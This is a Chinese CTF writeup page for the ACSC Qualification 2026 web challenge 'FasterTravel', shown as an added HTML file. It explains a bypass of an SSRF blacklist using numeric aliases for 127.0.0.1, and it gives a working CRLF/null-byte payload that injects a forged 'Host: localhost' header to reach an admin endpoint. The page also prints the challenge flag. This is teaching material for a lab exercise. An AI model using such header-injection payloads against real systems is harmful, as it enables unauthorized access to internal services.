@@ -1,0 +1,1489 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="CTF 竞赛解题记录与学习笔记">
+      
+      
+        <meta name="author" content="BIGC CTF Team">
+      
+      
+        <link rel="canonical" href="https://starnotes-xj.github.io/BIGC_CTF_Writeups/Web/ACSC2026Qualification_FasterTravel/">
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>ACSC Qualification 2026 - FasterTravel Writeup - BIGC CTF Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra_v3.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#acsc-qualification-2026-fastertravel-writeup" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="BIGC CTF Writeups" class="md-header__button md-logo" aria-label="BIGC CTF Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 11c0 5.55-3.84 10.74-9 12-5.16-1.26-9-6.45-9-12V5l9-4 9 4zm-9 10c3.75-1 7-5.46 7-9.78V6.3l-7-3.12z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            BIGC CTF Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              ACSC Qualification 2026 - FasterTravel Writeup
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  首页
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../guides/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  新手指南
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Web
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../Cryptography%28%E5%AF%86%E7%A0%81%E5%AD%A6%29/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  密码学
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../Reverse%20Engineering%28%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%29/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  逆向工程
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../Pwn/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Pwn
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../Misc%28%E6%9D%82%E9%A1%B9%29/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  杂项
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../PPC/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  PPC
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../events/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  比赛
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../history/competitions/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  历史参赛记录
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../tags/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  标签
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../WRITEUP_TEMPLATE/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  模板
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="BIGC CTF Writeups" class="md-nav__button md-logo" aria-label="BIGC CTF Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 11c0 5.55-3.84 10.74-9 12-5.16-1.26-9-6.45-9-12V5l9-4 9 4zm-9 10c3.75-1 7-5.46 7-9.78V6.3l-7-3.12z"/></svg>
+
+    </a>
+    BIGC CTF Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    首页
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../guides/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    新手指南
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Cryptography%28%E5%AF%86%E7%A0%81%E5%AD%A6%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    密码学
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Reverse%20Engineering%28%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    逆向工程
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Pwn/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pwn
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Misc%28%E6%9D%82%E9%A1%B9%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    杂项
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../PPC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PPC
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../events/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    比赛
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../history/competitions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    历史参赛记录
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tags/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    标签
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../WRITEUP_TEMPLATE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    模板
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        题目信息
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flag
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        解题过程
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="解题过程">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. 初始侦察/文件识别
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. 关键突破点一：先绕过 SSRF 黑名单
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-host" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. 关键突破点二：Host 头注入
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. 获取 Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        攻击链/解题流程总结
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        漏洞分析 / 机制分析
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="漏洞分析 / 机制分析">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        根因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        影响
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        修复建议（适用于漏洞类题目）
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        知识点
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        使用的工具
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        脚本归档
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gui" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        命令行提取关键数据（无 GUI）
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        推荐工具与优化解题流程
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="推荐工具与优化解题流程">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        工具对比总结
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        推荐流程
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        工具 A（推荐首选）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#b" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        工具 B（可选）
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="acsc-qualification-2026-fastertravel-writeup">ACSC Qualification 2026 - FasterTravel Writeup<a class="headerlink" href="#acsc-qualification-2026-fastertravel-writeup" title="Permanent link">&para;</a></h1>
+<div class="admonition warning">
+<p class="admonition-title">发布提醒</p>
+<p>官方 Qualification 页面显示本轮时间为 <strong>2026-03-01 18:00 CEST ～ 2026-05-01 18:00 CEST</strong>。当前文档适合作为<strong>本地归档草稿</strong>；若比赛尚未结束，请勿提前公开发布。</p>
+</div>
+<h2 id="_1">题目信息<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>比赛</strong>: ACSC Qualification 2026（Austria Cyber Security Challenge 2026 Qualification）</li>
+<li><strong>题目</strong>: FasterTravel</li>
+<li><strong>类别</strong>: Web</li>
+<li><strong>难度</strong>: 中等</li>
+<li><strong>附件/URL</strong>: <code>app.py</code> · <code>http/</code> · <code>templates/</code> · <code>Caddyfile</code> · <code>Dockerfile</code> · <code>docker-compose.yml</code> · <a href="https://4ty7qe174n8cri3w.dyn.acsc.land" target="_blank">在线靶机</a></li>
+<li><strong>附件链接</strong>: <a download="download" href="https://starnotes-xj.github.io/BIGC_CTF_Writeups/files/fastertravel/app.py">下载 app.py</a> · <a download="download" href="https://starnotes-xj.github.io/BIGC_CTF_Writeups/files/fastertravel/Dockerfile">下载 Dockerfile</a> · <a download="download" href="https://starnotes-xj.github.io/BIGC_CTF_Writeups/files/fastertravel/docker-compose.yml">下载 docker-compose.yml</a> · <a href="https://github.com/starnotes-xj/BIGC_CTF_Writeups/tree/main/CTF_Writeups/files/fastertravel" target="_blank">仓库位置</a></li>
+<li><strong>Flag格式</strong>: <code>dach2026{...}</code></li>
+<li><strong>状态</strong>: 已解</li>
+</ul>
+<h2 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>dach2026{how_is_there_another_forbidden_portal_nq9vcp4ayblyghwy}
+</code></pre></div>
+<h2 id="_2">解题过程<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h3 id="1">1. 初始侦察/文件识别<a class="headerlink" href="#1" title="Permanent link">&para;</a></h3>
+<ul>
+<li>首页功能很简单：输入一个 URL，服务端去抓取目标页面，生成一个短链接和预览页</li>
+<li><code>/admin</code> 是显眼的敏感入口，但直接访问会返回 403</li>
+<li>阅读源码可以看到两个核心点：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="nd">@server</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;/admin&quot;</span><span class="p">)</span>
+<span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">admin</span><span class="p">(</span><span class="n">request</span><span class="p">:</span> <span class="n">Request</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Response</span><span class="p">:</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">privileged_origin_access</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;Host&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)):</span>
+        <span class="k">return</span> <span class="n">Response</span><span class="o">.</span><span class="n">forbidden</span><span class="p">()</span>
+
+    <span class="k">return</span> <span class="n">Response</span><span class="o">.</span><span class="n">ok</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Welcome to the secret admin panel! Flag: </span><span class="si">{</span><span class="n">FLAG</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</code></pre></div>
+<p>以及：</p>
+<div class="highlight"><pre><span></span><code><span class="n">PRIVILEGED_ORIGINS</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="s2">&quot;localhost:5000&quot;</span><span class="p">)</span>
+</code></pre></div>
+<ul>
+<li>说明 <code>/admin</code> 只有在请求头里的 <code>Host</code> 等于：</li>
+<li><code>localhost</code></li>
+<li><code>localhost:5000</code>
+  时才会放行</li>
+</ul>
+<h3 id="2-ssrf">2. 关键突破点一：先绕过 SSRF 黑名单<a class="headerlink" href="#2-ssrf" title="Permanent link">&para;</a></h3>
+<ul>
+<li><code>/shorten</code> 会抓取用户给出的 URL：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form_args</span><span class="p">[</span><span class="s2">&quot;source&quot;</span><span class="p">]</span>
+<span class="n">scheme</span><span class="p">,</span> <span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">path</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">privileged_origin_access</span><span class="p">(</span><span class="n">hostname</span><span class="p">)</span> <span class="ow">or</span> <span class="nb">any</span><span class="p">(</span><span class="n">hostname</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">PRIVILEGED_ORIGINS</span><span class="p">)</span> <span class="ow">or</span> <span class="nb">any</span><span class="p">(</span><span class="n">hostname</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">PRIVILEGED_ORIGINS</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">Response</span><span class="o">.</span><span class="n">forbidden</span><span class="p">()</span>
+</code></pre></div>
+<ul>
+<li>这里明显想拦掉对本地敏感服务的 SSRF，但它只检查字符串层面的：</li>
+<li><code>localhost</code></li>
+<li>
+<p><code>localhost:5000</code></p>
+</li>
+<li>
+<p>实际请求器却会对主机名做 <code>getaddrinfo()</code>：</p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="n">addrs</span> <span class="o">=</span> <span class="k">await</span> <span class="n">loop</span><span class="o">.</span><span class="n">getaddrinfo</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">family</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</code></pre></div>
+<ul>
+<li>因此可以使用一些<strong>能解析到 127.0.0.1 的别名</strong>绕过黑名单，例如：</li>
+</ul>
+<div class="highlight"><pre><span></span><code>2130706433
+0x7f000001
+127.1
+</code></pre></div>
+<ul>
+<li>其中：</li>
+</ul>
+<div class="highlight"><pre><span></span><code>2130706433 = 127.0.0.1
+</code></pre></div>
+<ul>
+<li>所以第一层绕过很简单：把主机写成 <code>2130706433</code></li>
+</ul>
+<h3 id="3-host">3. 关键突破点二：Host 头注入<a class="headerlink" href="#3-host" title="Permanent link">&para;</a></h3>
+<ul>
+<li>仅仅 SSRF 到 <code>127.0.0.1</code> 还不够，因为 <code>/admin</code> 继续检查：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;Host&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+</code></pre></div>
+<ul>
+<li>如果我们访问的是：</li>
+</ul>
+<div class="highlight"><pre><span></span><code>http://2130706433:5001/admin
+</code></pre></div>
+<ul>
+<li>那么内部请求头会是：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="err">Host: 2130706433</span>
+</code></pre></div>
+<ul>
+<li>这不在白名单里，所以仍然只能得到：</li>
+</ul>
+<div class="highlight"><pre><span></span><code>Access Denied
+</code></pre></div>
+<ul>
+<li>关键在于题目自带的 <code>urlparse()</code> 和 <code>Requester.request()</code> 都非常“手搓”：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="n">host_and_port</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="s2">&quot;host_and_port&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">rsplit</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</code></pre></div>
+<p>以及：</p>
+<div class="highlight"><pre><span></span><code><span class="n">req</span> <span class="o">=</span> <span class="p">(</span>
+    <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">method</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2"> HTTP/1.1</span><span class="se">\r\n</span><span class="s2">&quot;</span>
+    <span class="sa">f</span><span class="s2">&quot;Host: </span><span class="si">{</span><span class="n">hostname</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&quot;</span>
+    <span class="sa">f</span><span class="s2">&quot;User-Agent: fasttravel/0.1</span><span class="se">\r\n</span><span class="s2">&quot;</span>
+    <span class="sa">f</span><span class="s2">&quot;Connection: close</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span>
+<span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">)</span>
+</code></pre></div>
+<ul>
+<li>
+<p>这里给了两个利用点：</p>
+</li>
+<li>
+<p><code>hostname</code> 会被原样插进 <code>Host:</code> 头里</p>
+</li>
+<li>
+<p><code>urlparse()</code> 允许我们把一些特殊字符混进 <code>hostname</code></p>
+</li>
+<li>
+<p>最终可用 payload 是：</p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code>http://2130706433%00%0d%0aHost:%20localhost%0d%0aFoo:%20bar:5001/admin
+</code></pre></div>
+<ul>
+<li>解码后等价于：</li>
+</ul>
+<div class="highlight"><pre><span></span><code>http://2130706433\0\r\nHost: localhost\r\nFoo: bar:5001/admin
+</code></pre></div>
